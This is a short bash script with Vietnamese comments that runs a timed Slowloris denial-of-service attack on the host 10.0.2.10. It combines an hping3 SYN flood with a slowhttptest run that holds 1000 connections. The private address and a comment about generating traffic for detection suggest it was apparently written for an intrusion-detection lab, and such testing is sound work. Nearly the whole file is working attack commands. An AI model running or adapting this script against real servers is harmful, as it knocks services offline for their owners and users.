#!/bin/bash
VICTIM="10.0.2.10"
DURATION=60

echo "Bat dau Slowloris vao $VICTIM trong $DURATION giay..."

# Giai doan 1: hping3 SYN flood nhe de tao du traffic cho detection
hping3 -S -p 80 -i u1000 $VICTIM &
HPING_PID=$!

# Giai doan 2: slowhttptest giu ket noi
slowhttptest -c 1000 -H -i 10 -r 200 -t GET -u http://$VICTIM/ -p 3 -l $DURATION 2>/dev/null &
SLOW_PID=$!

sleep $DURATION
kill $HPING_PID $SLOW_PID 2>/dev/null

echo "Hoan tat kich ban Slowloris!"